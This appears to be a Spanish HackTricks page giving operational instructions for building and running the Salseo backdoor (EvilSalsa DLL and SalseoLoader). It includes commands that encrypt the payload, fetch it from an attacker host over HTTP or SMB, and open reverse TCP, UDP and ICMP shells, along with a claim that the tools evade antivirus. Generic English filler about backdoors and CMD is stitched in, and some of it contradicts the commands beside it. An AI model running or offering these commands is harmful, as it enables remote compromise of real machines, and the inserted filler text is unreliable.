# Salseo

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* ¿Trabajas en una **empresa de ciberseguridad**? ¿Quieres ver tu **empresa anunciada en HackTricks**? ¿O quieres tener acceso a la **última versión de PEASS o descargar HackTricks en PDF**? ¡Consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colección exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obtén el [**swag oficial de PEASS y HackTricks**](https://peass.creator-spring.com)
* **Únete al** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de Telegram**](https://t.me/peass) o **sígueme** en **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Comparte tus trucos de hacking enviando PRs al** [**repositorio de hacktricks**](https://github.com/carlospolop/hacktricks) **y al** [**repositorio de hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## Compilando los binarios

Descarga el código fuente de GitHub y compila **EvilSalsa** y **SalseoLoader**. Necesitarás tener **Visual Studio** instalado para compilar el código.

Compila ambos proyectos para la arquitectura de la máquina Windows donde los vayas a utilizar (si Windows admite x64, compílalos para esa arquitectura).

Puedes **seleccionar la arquitectura** dentro de Visual Studio en la pestaña **"Build"** en **"Platform Target".**

(\*\*Si no encuentras estas opciones, presiona en **"Project Tab"** y luego en **"\<Project Name> Properties"**)

![](<../.gitbook/assets/image (132).png>)

Luego, compila ambos proyectos (Build -> Build Solution) (Dentro de los registros aparecerá la ruta del ejecutable):

![](<../.gitbook/assets/image (1) (2) (1) (1) (1).png>)

## Preparando la puerta trasera

En primer lugar, necesitarás codificar el **EvilSalsa.dll**. Para hacerlo, puedes usar el script de Python **encrypterassembly.py** o puedes compilar el proyecto **EncrypterAssembly**:

### **Python**
```
python EncrypterAssembly/encrypterassembly.py <FILE> <PASSWORD> <OUTPUT_FILE>
python EncrypterAssembly/encrypterassembly.py EvilSalsax.dll password evilsalsa.dll.txt
```
### Windows

#### Salseo Backdoor

The Salseo backdoor is a type of malware that allows unauthorized access to a Windows system. It is designed to remain hidden and provide a remote attacker with control over the infected machine. The Salseo backdoor can be used to steal sensitive information, execute commands, and perform various malicious activities.

##### Installation

The Salseo backdoor can be installed on a target system through various methods, including:

1. **Email attachments**: The malware can be delivered as an attachment in a phishing email. When the user opens the attachment, the backdoor is installed silently in the background.

2. **Exploiting vulnerabilities**: The backdoor can exploit vulnerabilities in software or the operating system to gain unauthorized access to the system. This can be done through techniques such as remote code execution or privilege escalation.

3. **Malicious downloads**: The backdoor can be bundled with legitimate-looking software or files that users download from untrusted sources. When the user executes the downloaded file, the backdoor is installed.

##### Functionality

Once installed, the Salseo backdoor provides the attacker with a range of capabilities, including:

1. **Remote access**: The attacker can remotely connect to the infected system and gain full control over it. This allows them to perform actions as if they were physically present on the machine.

2. **Data exfiltration**: The backdoor can be used to steal sensitive information from the infected system, such as login credentials, financial data, or personal files. This information can then be used for malicious purposes or sold on the dark web.

3. **Command execution**: The attacker can execute commands on the infected system, allowing them to perform various actions, such as downloading and executing additional malware, modifying system settings, or launching attacks on other systems.

4. **Persistence**: The Salseo backdoor is designed to maintain persistence on the infected system, ensuring that it remains active even after a system reboot. This allows the attacker to maintain access to the compromised machine for an extended period.

##### Detection and Prevention

Detecting and preventing the Salseo backdoor can be challenging due to its stealthy nature. However, there are some measures that can be taken to mitigate the risk:

1. **Antivirus software**: Keeping antivirus software up to date can help detect and remove known instances of the Salseo backdoor.

2. **Regular system updates**: Installing software updates and patches can help prevent the exploitation of vulnerabilities that the backdoor may rely on.

3. **User awareness**: Educating users about the risks of opening suspicious email attachments or downloading files from untrusted sources can help prevent the initial installation of the backdoor.

4. **Network monitoring**: Monitoring network traffic for suspicious activity can help detect the presence of the backdoor or its communication with the attacker's command and control server.

By implementing these measures, organizations can reduce the risk of falling victim to the Salseo backdoor and other similar malware.
```
EncrypterAssembly.exe <FILE> <PASSWORD> <OUTPUT_FILE>
EncrypterAssembly.exe EvilSalsax.dll password evilsalsa.dll.txt
```
Ok, ahora tienes todo lo que necesitas para ejecutar todo el asunto de Salseo: el **EvilDalsa.dll codificado** y el **binario de SalseoLoader**.

**Sube el binario SalseoLoader.exe a la máquina. No deberían ser detectados por ningún AV...**

## **Ejecutar la puerta trasera**

### **Obtener una shell inversa TCP (descargando el dll codificado a través de HTTP)**

Recuerda iniciar un nc como el oyente de la shell inversa y un servidor HTTP para servir el evilsalsa codificado.
```
SalseoLoader.exe password http://<Attacker-IP>/evilsalsa.dll.txt reversetcp <Attacker-IP> <Port>
```
### **Obteniendo una shell inversa UDP (descargando un dll codificado a través de SMB)**

Recuerda iniciar un nc como oyente de la shell inversa y un servidor SMB para servir el evilsalsa codificado (impacket-smbserver).
```
SalseoLoader.exe password \\<Attacker-IP>/folder/evilsalsa.dll.txt reverseudp <Attacker-IP> <Port>
```
### **Obteniendo una shell inversa ICMP (dll codificada ya presente en la víctima)**

**Esta vez necesitarás una herramienta especial en el cliente para recibir la shell inversa. Descarga:** [**https://github.com/inquisb/icmpsh**](https://github.com/inquisb/icmpsh)

#### **Desactivar respuestas ICMP:**
```
sysctl -w net.ipv4.icmp_echo_ignore_all=1

#You finish, you can enable it again running:
sysctl -w net.ipv4.icmp_echo_ignore_all=0
```
#### Ejecutar el cliente:

To execute the client, you need to follow these steps:

1. Open a terminal window.
2. Navigate to the directory where the client is located.
3. Run the client executable by typing the command `./client`.

This will start the client and establish a connection with the server. Make sure to provide the necessary parameters, such as the server IP address and port number, if required.
```
python icmpsh_m.py "<Attacker-IP>" "<Victm-IP>"
```
#### Dentro de la víctima, vamos a ejecutar el salseo:
```
SalseoLoader.exe password C:/Path/to/evilsalsa.dll.txt reverseicmp <Attacker-IP>
```
## Compilando SalseoLoader como DLL exportando la función principal

Abre el proyecto SalseoLoader usando Visual Studio.

### Agrega antes de la función principal: \[DllExport]

![](<../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)

### Instala DllExport para este proyecto

#### **Herramientas** --> **Gestor de paquetes NuGet** --> **Administrar paquetes NuGet para la solución...**

![](<../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)

#### **Busca el paquete DllExport (usando la pestaña Examinar) y presiona Instalar (y acepta el mensaje emergente)**

![](<../.gitbook/assets/image (4) (1) (1) (1) (1) (1) (1).png>)

En la carpeta de tu proyecto han aparecido los archivos: **DllExport.bat** y **DllExport\_Configure.bat**

### **Desinstala DllExport**

Presiona **Desinstalar** (sí, es extraño pero confía en mí, es necesario)

![](<../.gitbook/assets/image (5) (1) (1) (2) (1).png>)

### **Cierra Visual Studio y ejecuta DllExport\_configure**

Simplemente **cierra** Visual Studio

Luego, ve a tu carpeta **SalseoLoader** y **ejecuta DllExport\_Configure.bat**

Selecciona **x64** (si lo vas a usar en una máquina x64, ese fue mi caso), selecciona **System.Runtime.InteropServices** (dentro de **Namespace para DllExport**) y presiona **Aplicar**

![](<../.gitbook/assets/image (7) (1) (1) (1).png>)

### **Abre el proyecto nuevamente con Visual Studio**

**\[DllExport]** ya no debería estar marcado como error

![](<../.gitbook/assets/image (8) (1).png>)

### Compila la solución

Selecciona **Tipo de salida = Biblioteca de clases** (Proyecto --> Propiedades de SalseoLoader --> Aplicación --> Tipo de salida = Biblioteca de clases)

![](<../.gitbook/assets/image (10) (1).png>)

Selecciona la **plataforma x64** (Proyecto --> Propiedades de SalseoLoader --> Compilar --> Destino de la plataforma = x64)

![](<../.gitbook/assets/image (9) (1) (1).png>)

Para **compilar** la solución: Compilar --> Compilar solución (Dentro de la consola de salida aparecerá la ruta de la nueva DLL)

### Prueba la DLL generada

Copia y pega la DLL donde quieras probarla.

Ejecuta:
```
rundll32.exe SalseoLoader.dll,main
```
Si no aparece ningún error, ¡probablemente tienes una DLL funcional!

## Obtén una shell usando la DLL

No olvides usar un **servidor** **HTTP** y configurar un **escucha nc**

### Powershell
```
$env:pass="password"
$env:payload="http://10.2.0.5/evilsalsax64.dll.txt"
$env:lhost="10.2.0.5"
$env:lport="1337"
$env:shell="reversetcp"
rundll32.exe SalseoLoader.dll,main
```
### CMD

CMD (Command Prompt) is a command-line interpreter in Windows operating systems. It provides a text-based interface for executing commands and managing the system. CMD can be used to perform various tasks, such as navigating through directories, running programs, and managing files and processes.

CMD is a powerful tool for hackers as it allows them to execute commands and scripts on a target system. By gaining access to CMD, hackers can perform a wide range of activities, including reconnaissance, privilege escalation, and data exfiltration.

To exploit CMD, hackers often use backdoors to maintain persistent access to a compromised system. A backdoor is a hidden entry point that allows unauthorized access to a system. By installing a backdoor on a target system, hackers can bypass security measures and gain remote access at any time.

There are several methods to create a backdoor in CMD. One common technique is to modify system files or registry entries to enable remote access. Another method is to use a Trojan horse program that disguises itself as a legitimate file or application.

Once a backdoor is installed, hackers can use CMD to execute commands and control the compromised system. They can upload and download files, manipulate system settings, and even launch attacks on other systems.

To protect against CMD-based attacks, it is important to regularly update and patch your operating system. Additionally, implementing strong access controls and monitoring network traffic can help detect and prevent unauthorized access.

Remember, CMD can be a powerful tool in the hands of both hackers and system administrators. Understanding its capabilities and vulnerabilities is essential for maintaining the security of your systems.
```
set pass=password
set payload=http://10.2.0.5/evilsalsax64.dll.txt
set lhost=10.2.0.5
set lport=1337
set shell=reversetcp
rundll32.exe SalseoLoader.dll,main
```
<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* ¿Trabajas en una **empresa de ciberseguridad**? ¿Quieres ver tu **empresa anunciada en HackTricks**? ¿O quieres tener acceso a la **última versión de PEASS o descargar HackTricks en PDF**? ¡Consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
* Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colección exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obtén el [**merchandising oficial de PEASS y HackTricks**](https://peass.creator-spring.com)
* **Únete al** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de Telegram**](https://t.me/peass) o **sígueme** en **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Comparte tus trucos de hacking enviando PRs al** [**repositorio de hacktricks**](https://github.com/carlospolop/hacktricks) **y al** [**repositorio de hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
